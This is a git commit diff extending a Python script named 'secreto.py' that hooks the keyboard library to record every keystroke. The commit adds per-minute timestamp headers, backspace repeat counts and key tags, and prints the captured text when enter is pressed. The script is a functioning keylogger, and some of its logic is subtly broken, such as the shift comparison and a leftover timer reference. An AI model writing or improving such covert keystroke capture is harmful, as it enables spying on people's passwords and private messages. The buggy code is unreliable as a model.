4aca492b91a98283ff39550829a10241325a6a08
Gabriel Molin <molinguin@gmail.com>
2023-05-19 16:58:24 -0300

    feat: timer, header and keycount

--- secreto.py
+++ secreto.py
@@ -1,35 +1,66 @@
 import keyboard
-from threading import Timer
+import time
+import datetime
 
 class Texto:
     def __init__(self) -> None:
         self.texto = ""
-        self.timer = 0
+        self.initialTime = time.time()
+        self.lastKey = ""
+        self.sameKeyCounter = 1
+
+        self.setHeader()
         return
     
     def setTexto(self, str):
         self.texto += str
         return
     
+    def setHeader(self):
+        datetimeNow = datetime.datetime.now()
+        dataStr = str(datetimeNow.day) + "/" + str(datetimeNow.month) + "/" + str(datetimeNow.year)
+        horaStr = str(datetimeNow.hour) +":"+str(datetimeNow.minute)
+        header = "\n\n ---------[" + str(dataStr) + "|" + str(horaStr) + "] ---------\n"
+        self.texto += header
+    
     def onKeyPress(self, key):
         self.setTexto(self.treatChar(key.name))
-        if(key.name == "esc"):
+
+        if(key.name == self.lastKey):
+            self.sameKeyCounter += 1
+        else:
+            self.sameKeyCounter = 1
+        
+        if(time.time() - self.initialTime > 60):
+            self.setHeader()
+            self.initialTime = time.time()
+
+        if(key.name == "enter"):
             print(self.texto)
+
+        self.lastKey = key.name
         return
     
     def treatChar(self, char):
         if(len(char) == 1):
             return char
         else:
+            treatedChar = ""
+            
+
             if(char == "space"):
-                return " "
+                treatedChar += " "
             elif(char == "esc"):
-                return "[esc]"
-            elif(char == "enter"):
-                return "[enter]"
-            elif(char == "backspace"):
-                return "[<-]"
-            return char
+                treatedChar += "[esc]"
+            # elif(char == "enter"):
+            #     return "[enter]"
+            elif(self.lastKey == "backspace" and char != "backspace"):
+                treatedChar += "[<-" + str(self.sameKeyCounter) + "x]"
+            elif(char == ("rshift" or "lshift" or "shift")):
+                treatedChar += "[shift]"
+            elif(char == ("enter")):
+                treatedChar += "[enter]\n"
+            return treatedChar
     
     def resetTimer(self):
         self.timer = 0
